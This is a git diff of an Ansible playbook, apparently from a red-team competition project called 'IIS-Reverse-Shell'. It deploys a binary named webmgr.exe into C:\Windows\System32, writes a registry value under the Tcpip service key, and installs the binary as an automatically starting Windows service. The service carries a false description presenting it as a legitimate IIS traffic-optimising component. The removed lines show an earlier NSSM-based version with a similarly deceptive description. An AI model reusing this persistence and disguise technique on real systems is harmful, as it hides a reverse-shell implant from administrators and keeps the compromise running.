@@ -90,41 +90,22 @@
       win_copy:
         src: "~/IIS-Reverse-Shell/Persistence/webmgr.exe"
         dest: "C:\\Windows\\System32"
+     
+    - name: Creates Competition Variable Registry Key
+      win_regedit:
+      	path: HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip
+      	name: Competition
+      	data: "{{ Competition }}"
+      	type: string
+      	
+    - name: Adds Executable to Services
+      win_shell:  New-Service -Name "Website Manager Service" -Binary "C:\Windows\System32\webmgr.exe" -DisplayName "Website Manager Service" -Description "This service is an integrated IIS component that optimizes and secures web server connections by dynamically regulating inbound traffic." -StartupType Automatic
         
-    - name: Downloads NSSM
-      win_get_url:
-        url: "https://nssm.cc/release/nssm-2.24.zip"
-        dest: "C:\\nssm-2.24.zip"
-        
-    - name: Stops WebMgrService (if running)
+    - name: Starts Service
       win_service:
-        name: "WebMgrService"
-        state: stopped
+        name: "Website Manager Service"
+        state: started
       ignore_errors: yes
-        
-    - name: Extracts NSSM
-      win_unzip:
-        src: "C:\\nssm-2.24.zip"
-        dest: "C:\\Windows\\Tasks\\nssm-2.24"
-        remote_src: yes
-
-    - name: Deletes the NSSM ZIP File After Extraction
-      win_shell: Remove-Item -Path "C:\\nssm-2.24.zip" -Force
-      
-    - name: Creates and Configures WebMgr Service
-      win_shell: |
-        $nssmPath = "C:\\Windows\\Tasks\\nssm-2.24\\nssm-2.24\\win64\\nssm.exe"
-        $serviceName = "WebMgrService"
-        $executablePath = "C:\\Windows\\System32\\WebMgr.exe"
-        $arguments = "{{ Competition }}"
-        $displayName = "Web Manager Service"
-        $description = "Manages the current web application and is required to prevent total service failure."
-
-        & $nssmPath install $serviceName $executablePath $arguments
-        & $nssmPath set $serviceName DisplayName $displayName
-        & $nssmPath set $serviceName Description $description
-        & $nssmPath set $serviceName Start SERVICE_AUTO_START
-        Start-Service -Name $serviceName
       
     - name: Opens Port 80 in Windows Firewall
       win_firewall_rule:
